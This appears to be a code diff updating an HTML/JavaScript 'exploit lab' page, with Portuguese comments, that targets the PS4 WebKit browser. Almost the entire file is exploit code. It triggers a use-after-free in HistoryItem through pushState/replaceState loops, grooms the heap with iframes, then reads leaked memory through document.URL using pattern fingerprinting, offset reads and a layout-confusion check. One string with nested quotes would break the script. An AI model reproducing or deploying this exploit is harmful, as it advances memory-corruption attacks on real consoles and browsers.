@@ -1,91 +1,144 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Document Internal Read</title>
+<title>PS4 WebKit Exploit Lab - UAF to Leak</title>
 <style>
-body { font-family: monospace; background:#000; color:#0f0; }
-button { font-size:16px; padding:10px; }
-#log { white-space: pre-wrap; }
+    body { font-family: monospace; background:#000; color:#0f0; padding: 20px; }
+    .btn-group { margin-bottom: 20px; }
+    button { 
+        font-size:14px; padding:12px; background: #222; color: #0f0; 
+        border: 1px solid #0f0; cursor: pointer; margin-right: 5px;
+    }
+    button:hover { background: #0f0; color: #000; }
+    #log { white-space: pre-wrap; border-top: 1px dashed #0f0; margin-top: 20px; padding-top: 10px; }
+    .highlight { color: #ff0; }
 </style>
 </head>
-
 <body>
-<h2>PS4 WebKit – Document Internal Field Touch</h2>
-<button onclick="run()">RUN INTERNAL READ</button>
-<div id="log"></div>
+
+<h2>PS4 WebKit Lab: HistoryItem UAF</h2>
+<div class="btn-group">
+    <button onclick="runTest('FINGERPRINT')">1. Passo A: Fingerprint</button>
+    <button onclick="runTest('WINDOWED')">2. Passo B: Windowed Read</button>
+    <button onclick="runTest('CONFUSION')">3. Passo C: Layout Confusion</button>
+</div>
+
+<div id="log">Aguardando comando...</div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
+function log(m){ logEl.innerHTML += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-async function run(){
+// Padrão de identificação para o Passo A
+function getPattern(char, size) {
+    let chunk = char.repeat(8) + "0000"; 
+    return chunk.repeat(Math.floor(size / chunk.length));
+}
+
+async function runTest(mode) {
     logEl.textContent = "";
-    log("=== START ===");
+    log(`=== MODO: ${mode} ===`);
 
     let size = 977;
     const STEP = 14461;
 
-    // ----------------------------
-    // Phase 1 – Original UAF trigger
-    // ----------------------------
-    for(let i=0;i<48;i++){
-        let frag = "A".repeat(size);
-        history.pushState({}, "", "#"+frag);
-        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0)
-            setTimeout(()=>history.back(),0);
+    // --------------------------------------------------
+    // FASE 1 - Trigger (Mantendo seus valores originais)
+    // --------------------------------------------------
+    log("Disparando UAF no History...");
+    for(let i=0; i<48; i++) {
+        let frag;
+        if (mode === 'FINGERPRINT') {
+            // Alterna letras para mapear qual bloco será reusado
+            let char = String.fromCharCode(0x41 + (i % 26)); // A, B, C...
+            frag = getPattern(char, size);
+        } else {
+            frag = "A".repeat(size);
+        }
+
+        history.pushState({}, "", "#" + frag);
+        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
+        
+        if(i % 6 === 0) setTimeout(() => history.back(), 0);
         size += STEP;
         await sleep(5);
     }
 
-    log(">>> UAF WINDOW <<<");
+    log("Aguardando janela UAF...");
     await sleep(120);
 
-    // ----------------------------
-    // Phase 2 – Document reuse
-    // ----------------------------
+    // --------------------------------------------------
+    // FASE 2 - Reuso (Heap Grooming com Iframes)
+    // --------------------------------------------------
+    log("Limpando/Reusando memória...");
     let frames = [];
-    for(let i=0;i<80;i++){
+    for(let i=0; i<80; i++) {
         let f = document.createElement("iframe");
         document.body.appendChild(f);
         try {
             let d = f.contentDocument;
             d.open();
-            d.write("<html><body>"+("X".repeat(2048))+"</body></html>");
+            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
             d.close();
         } catch(e){}
         frames.push(f);
     }
-    frames.forEach(f=>f.remove());
+    frames.forEach(f => f.remove());
     frames = null;
-
     await sleep(80);
 
-    // ----------------------------
-    // Phase 3 – INTERNAL READS
-    // ----------------------------
-    log("[READ] touching document internals");
+    // --------------------------------------------------
+    // FASE 3 - Análise Específica
+    // --------------------------------------------------
+    const leakedURL = document.URL;
+    const len = leakedURL.length;
+    log(`URL Length: <span class="highlight">${len}</span>`);
 
-    try { log("document.URL.length = " + document.URL.length); } catch(e){ log("URL error"); }
-    try { log("document.domain = " + document.domain); } catch(e){ log("domain error"); }
-    try { log("document.characterSet = " + document.characterSet); } catch(e){ log("charset error"); }
-    try { log("document.readyState = " + document.readyState); } catch(e){ log("readyState error"); }
-
-    // force layout access
-    try {
-        let w = document.body.offsetWidth;
-        let h = document.body.offsetHeight;
-        log("layout read ok w="+w+" h="+h);
-    } catch(e){
-        log("layout error");
+    if (mode === 'FINGERPRINT') {
+        log("[ANALISANDO PADRÕES]");
+        // Procura por sequências de letras que injetamos na Fase 1
+        let found = false;
+        for(let j=0; j<26; j++) {
+            let char = String.fromCharCode(0x41 + j);
+            let pattern = char.repeat(8);
+            if (leakedURL.indexOf(pattern) !== -1) {
+                log(`FONTE DETECTADA: Bloco de caracteres <span class="highlight">${char}</span> encontrado no offset ${leakedURL.indexOf(pattern)}`);
+                found = true;
+            }
+        }
+        if(!found) log("Nenhum padrão antigo detectado. A memória foi limpa ou sobrescrita por dados novos.");
     }
 
-    log("history.length = " + history.length);
-    log("=== END ===");
+    if (mode === 'WINDOWED') {
+        log("[LEITURA CIRÚRGICA - OFFSETS]");
+        let offsets = [0, 1000, 5000, 10000, 50000, 100000, 200000, len-1];
+        offsets.forEach(off => {
+            if (off < len) {
+                let code = leakedURL.charCodeAt(off);
+                let hex = code.toString(16).toUpperCase().padStart(4, '0');
+                log(`Offset [${off}]: CharCode=0x${hex} ('${String.fromCharCode(code & 0xFF)}')`);
+            }
+        });
+    }
+
+    if (mode === 'CONFUSION') {
+        log("[CONTROLE DE LAYOUT]");
+        let oldLen = document.URL.length;
+        location.hash = "SMALL"; 
+        log(`Novo hash setado para #SMALL`);
+        log(`Novo Length: ${document.URL.length}`);
+        if (document.URL.length === oldLen) {
+            log("<span class="highlight">ALERTA: O length não mudou! O ponteiro está preso no buffer antigo (UAF Confirmado).</span>");
+        } else {
+            log("O length mudou. O motor atualizou o ponteiro corretamente.");
+        }
+    }
+
+    log("=== FIM DO TESTE ===");
 }
 </script>
 </body>
 </html>
-
